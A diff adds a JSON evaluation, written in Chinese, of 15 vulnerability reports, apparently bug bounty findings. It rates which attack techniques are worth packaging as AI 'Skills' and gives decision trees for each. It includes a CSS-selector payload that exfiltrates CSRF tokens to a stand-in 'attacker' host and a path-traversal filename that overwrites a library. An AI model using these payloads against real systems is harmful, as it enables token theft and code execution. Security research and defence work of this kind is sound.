@@ -1,0 +1,362 @@
+{
+ "summary": {
+  "total": 15,
+  "worth_skill": 8,
+  "not_worth": 7,
+  "top_ids": [
+   2408074,
+   1115864,
+   386334,
+   507525,
+   1820955,
+   1952978,
+   403039,
+   273647
+  ]
+ },
+ "detailed_evaluations": [
+  {
+   "id": 181879,
+   "knowledge_point": "mruby 结构体类型混淆导致 RCE",
+   "is_ai_likely_known": false,
+   "reason": "mruby 内部对象模型的具体漏洞，训练数据稀少，需要深入理解动态语言内部实现。",
+   "scene_frequency": "低频",
+   "migration_potential": "低（高度依赖 mruby 特定实现，难以迁移到其他语言或框架）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。该漏洞高度依赖 mruby 特定版本和内部结构，可迁移性低。",
+   "skill_framework": null
+  },
+  {
+   "id": 386334,
+   "knowledge_point": "CSS 注入枚举 CSRF token 并组合 XSS",
+   "is_ai_likely_known": false,
+   "reason": "CSS 属性选择器枚举 token 属于高级技巧，训练数据较少，且需要结合具体上下文。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何使用 CSS 注入且 token 在页面中的场景，如邮件客户端、Web 应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'CSS 注入窃取敏感信息'的原理、攻击链和防御。",
+   "skill_framework": {
+    "name": "CSS 注入窃取敏感信息（CSRF token、密码等）",
+    "适用场景": [
+     "CSS 注入点",
+     "CSRF token 防护",
+     "邮件客户端"
+    ],
+    "核心原理": [
+     "CSS 属性选择器可基于元素属性值进行匹配",
+     "通过注入 CSS 构造条件请求，枚举 token 字符"
+    ],
+    "决策树": [
+     "IF 存在 CSS 注入点 AND 页面包含敏感属性（如 token） → 尝试注入 CSS 选择器枚举"
+    ],
+    "示例": [
+     "input[name='csrf_token'][value^='a'] { background: url(https://attacker/?c=a) }"
+    ],
+    "迁移场景": [
+     "XSS 组合攻击",
+     "信息窃取",
+     "CSRF 防护绕过"
+    ]
+   }
+  },
+  {
+   "id": 507525,
+   "knowledge_point": "代理服务器滥用导致 DoS（慢速响应、分块传输、CDN 缓存绕过）",
+   "is_ai_likely_known": false,
+   "reason": "代理服务器配置缺陷的具体利用方式，训练数据较少，需要结合多种技术。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何代理服务器、CDN、负载均衡器）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'代理服务器 DoS 攻击'的多种技术和防御。",
+   "skill_framework": {
+    "name": "代理服务器 DoS 攻击（慢速响应、分块传输、缓存绕过）",
+    "适用场景": [
+     "代理服务器",
+     "CDN",
+     "负载均衡器"
+    ],
+    "核心原理": [
+     "代理服务器未设置超时和大小限制",
+     "慢速响应和分块传输可耗尽资源",
+     "CDN 缓存绕过可放大攻击"
+    ],
+    "决策树": [
+     "IF 存在代理服务器 AND 未设置超时/大小限制 → 尝试慢速响应或分块传输",
+     "IF 存在 CDN 缓存 → 尝试绕过缓存直接请求源站"
+    ],
+    "示例": [
+     "发送大量慢速响应请求，占用代理连接",
+     "构造分块传输请求，使代理等待后续数据"
+    ],
+    "迁移场景": [
+     "DoS 攻击",
+     "资源耗尽",
+     "基础设施攻击"
+    ]
+   }
+  },
+  {
+   "id": 838685,
+   "knowledge_point": "mod_proxy_ftp 未初始化值导致信息泄露",
+   "is_ai_likely_known": false,
+   "reason": "Apache 模块的具体漏洞，训练数据稀少，需要深入理解 FTP 协议和 C 语言内存管理。",
+   "scene_frequency": "低频",
+   "migration_potential": "低（高度依赖 mod_proxy_ftp 实现，难以迁移）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。该漏洞是特定模块的缺陷，可迁移性低。",
+   "skill_framework": null
+  },
+  {
+   "id": 1115864,
+   "knowledge_point": "Android ContentProvider 路径遍历导致持久化代码执行",
+   "is_ai_likely_known": false,
+   "reason": "Android 组件间数据流信任边界突破的具体案例，训练数据较少，需要理解 Android 组件模型。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何 Android 应用，涉及 ContentProvider、导出组件、文件写入）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'Android 组件间信任边界突破'的原理和防御。",
+   "skill_framework": {
+    "name": "Android 组件间信任边界突破（ContentProvider 路径遍历）",
+    "适用场景": [
+     "Android 应用安全测试",
+     "ContentProvider 漏洞",
+     "导出组件"
+    ],
+    "核心原理": [
+     "ContentProvider 提供的数据不可信",
+     "文件名未校验路径分隔符，导致路径遍历",
+     "覆盖应用库文件实现持久化"
+    ],
+    "决策树": [
+     "IF 应用导出组件 AND 接受外部 ContentProvider 数据 → 检查文件名是否包含路径分隔符",
+     "IF 可写入应用目录 → 尝试覆盖库文件"
+    ],
+    "示例": [
+     "恶意 App 提供 _display_name='../../lib/libyoga.so' 覆盖库文件"
+    ],
+    "迁移场景": [
+     "Android 恶意软件",
+     "持久化攻击",
+     "供应链攻击"
+    ]
+   }
+  },
+  {
+   "id": 1486417,
+   "knowledge_point": "通过隐藏端点绕过 UI 限制",
+   "is_ai_likely_known": true,
+   "reason": "这是常见的 API 安全测试技巧，AI 训练数据中常见。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到任何 Web 应用，通过 JS 分析发现隐藏端点）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：'Web API 安全测试'。该技巧是通用套路，AI 已知，但可并入更全面的 API 测试 Skill。",
+   "skill_framework": null
+  },
+  {
+   "id": 1081137,
+   "knowledge_point": "公开 token 绕过授权检查",
+   "is_ai_likely_known": true,
+   "reason": "这是常见的逻辑漏洞，AI 训练数据中常见。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到任何使用 token 进行授权的应用）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：'Web 授权绕过'。该技巧是通用套路，AI 已知，但可并入更全面的授权测试 Skill。",
+   "skill_framework": null
+  },
+  {
+   "id": 1040373,
+   "knowledge_point": "响应操纵绕过密码确认",
+   "is_ai_likely_known": true,
+   "reason": "这是常见的客户端验证绕过，AI 训练数据中常见。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到任何依赖客户端验证的流程）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：'Web 认证绕过'。该技巧是通用套路，AI 已知，但可并入更全面的认证测试 Skill。",
+   "skill_framework": null
+  },
+  {
+   "id": 240886,
+   "knowledge_point": "null 字节绕过路径过滤",
+   "is_ai_likely_known": true,
+   "reason": "null 字节注入是经典技巧，AI 训练数据中常见，但现代环境可能已失效。",
+   "scene_frequency": "中频",
+   "migration_potential": "中（可迁移到其他过滤逻辑，但受限于语言和框架）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：'路径遍历与过滤绕过'。该技巧是通用套路，AI 已知，但可并入更全面的路径安全 Skill。",
+   "skill_framework": null
+  },
+  {
+   "id": 1596252,
+   "knowledge_point": "Content-Length 整数溢出导致 DoS",
+   "is_ai_likely_known": false,
+   "reason": "特定于 lua_read_body() 的整数溢出，训练数据稀少，需要理解内存分配机制。",
+   "scene_frequency": "低频",
+   "migration_potential": "低（高度依赖特定实现，难以迁移）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。该漏洞是特定实现的缺陷，可迁移性低。",
+   "skill_framework": null
+  },
+  {
+   "id": 1820955,
+   "knowledge_point": "undici 库 host 头 CRLF 注入",
+   "is_ai_likely_known": false,
+   "reason": "特定库的防御不一致，训练数据稀少，需要理解 HTTP 头处理细节。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何 HTTP 客户端库，检查头过滤一致性）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'HTTP 头过滤一致性检查'的原理和防御。",
+   "skill_framework": {
+    "name": "HTTP 头过滤一致性检查（CRLF 注入）",
+    "适用场景": [
+     "HTTP 客户端库",
+     "Web 服务器",
+     "代理服务器"
+    ],
+    "核心原理": [
+     "所有 HTTP 头必须统一过滤 CRLF",
+     "不一致的过滤导致注入"
+    ],
+    "决策树": [
+     "IF 使用 HTTP 客户端库 → 检查所有头是否都过滤 CRLF",
+     "IF 存在未过滤的头 → 尝试注入 CRLF"
+    ],
+    "示例": [
+     "undici 中 host 头未过滤，其他头已过滤"
+    ],
+    "迁移场景": [
+     "请求走私",
+     "缓存投毒",
+     "会话固定"
+    ]
+   }
+  },
+  {
+   "id": 1952978,
+   "knowledge_point": "Node.js 权限策略未处理路径遍历",
+   "is_ai_likely_known": false,
+   "reason": "Node.js 实验性权限策略的具体缺陷，训练数据稀少，需要理解路径解析。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何权限检查系统，强调路径规范化）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'权限检查中的路径规范化'原则。",
+   "skill_framework": {
+    "name": "权限检查中的路径规范化",
+    "适用场景": [
+     "文件系统权限",
+     "沙箱",
+     "容器安全"
+    ],
+    "核心原理": [
+     "权限检查必须基于规范化路径",
+     "未处理路径遍历导致绕过"
+    ],
+    "决策树": [
+     "IF 存在目录限制 → 检查是否使用 realpath 规范化",
+     "IF 未规范化 → 尝试 ../ 绕过"
+    ],
+    "示例": [
+     "--allow-fs-write 限制目录，但 ../ 可写入外部"
+    ],
+    "迁移场景": [
+     "沙箱逃逸",
+     "容器逃逸",
+     "文件系统隔离"
+    ]
+   }
+  },
+  {
+   "id": 273647,
+   "knowledge_point": "邮箱唯一性检查绕过（空格）",
+   "is_ai_likely_known": true,
+   "reason": "这是常见的输入规范化问题，AI 训练数据中常见。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到任何唯一性检查）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：'输入规范化与唯一性检查'。该技巧是通用套路，AI 已知，但可并入更全面的输入安全 Skill。",
+   "skill_framework": null
+  },
+  {
+   "id": 2408074,
+   "knowledge_point": "undici 跨域重定向未清除 Proxy-Authorization 头",
+   "is_ai_likely_known": false,
+   "reason": "特定库的敏感头清理不完整，训练数据稀少，需要理解重定向处理逻辑。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何 HTTP 客户端，检查重定向时敏感头清理）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'HTTP 客户端重定向敏感头清理'的检查清单。",
+   "skill_framework": {
+    "name": "HTTP 客户端重定向敏感头清理",
+    "适用场景": [
+     "HTTP 客户端库",
+     "代理",
+     "浏览器"
+    ],
+    "核心原理": [
+     "跨域重定向时不应转发敏感头",
+     "清理不完整导致凭据泄露"
+    ],
+    "决策树": [
+     "IF 使用 HTTP 客户端 → 检查重定向时是否清除所有敏感头",
+     "IF 未清除 → 尝试构造跨域重定向窃取凭据"
+    ],
+    "示例": [
+     "undici 清除 Authorization 和 Cookie，但遗漏 Proxy-Authorization"
+    ],
+    "迁移场景": [
+     "凭据泄露",
+     "会话劫持",
+     "OAuth 安全"
+    ]
+   }
+  },
+  {
+   "id": 403039,
+   "knowledge_point": "黑名单角色提升绕过（通过中间角色）",
+   "is_ai_likely_known": false,
+   "reason": "黑名单策略的优雅绕过，训练数据较少，需要理解角色提升逻辑。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何基于角色的权限系统）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'黑名单权限策略绕过'的原理和防御。",
+   "skill_framework": {
+    "name": "黑名单权限策略绕过（通过中间角色）",
+    "适用场景": [
+     "角色权限系统",
+     "RBAC",
+     "WooCommerce 等插件"
+    ],
+    "核心原理": [
+     "黑名单只限制直接提权，未限制中间角色",
+     "通过中间角色获得能力，再组合攻击"
+    ],
+    "决策树": [
+     "IF 存在角色提升限制 → 检查是否可提升到中间角色",
+     "IF 可提升到中间角色 → 尝试利用中间角色能力提权"
+    ],
+    "示例": [
+     "Shopmanager 不能直接提权为管理员，但可提升用户为编辑，再通过 XSS 提权"
+    ],
+    "迁移场景": [
+     "权限提升",
+     "XSS 组合攻击",
+     "业务逻辑漏洞"
+    ]
+   }
+  }
+ ]
+}
